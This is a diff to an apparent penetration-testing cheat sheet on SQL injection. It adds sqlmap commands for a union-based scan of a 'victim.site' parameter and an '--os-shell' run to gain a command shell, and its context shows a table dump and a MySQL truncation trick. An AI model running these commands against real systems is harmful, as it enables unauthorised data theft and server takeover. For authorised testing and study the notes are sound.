@@ -86,8 +86,18 @@ sqlmap -r request.txt -p username --dbms=mysql --dump -D Webapp -T Users
 
 ## Quick Usage
 
+Here we are testing for Union query based based attackes on the id parameter
+
 ```
 sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U
+```
+
+### Quick Shell
+
+Here were are testing the email \(username\) parameter for injection to use the built in shell. Based on request file obtained from burp.
+
+```
+sqlmap -r req.txt -p email --os-shell
 ```
 
 ### Use proxy
@@ -273,7 +283,7 @@ You can run commands straight from the sql-query in MSSQL.
 
 ## Truncating Mysql Vulerability
 
-Basically this happens when you don't validate the length of user input.   
+Basically this happens when you don't validate the length of user input.  
 Two things are needed for it to work:
 
 * Mysql does not make comparisons in binary mode. This means that "admin" and "admin        " are the same.
